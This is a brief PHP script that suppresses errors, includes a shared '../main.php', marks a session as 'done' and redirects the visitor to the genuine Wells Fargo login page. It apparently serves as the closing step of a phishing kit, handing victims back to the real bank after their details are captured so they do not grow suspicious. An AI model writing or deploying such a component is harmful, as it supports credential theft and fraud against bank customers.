<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';

$_SESSION['done'] = true;
echo "<META HTTP-EQUIV='refresh' content='0; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&destination=AccountSummary'>";
exit();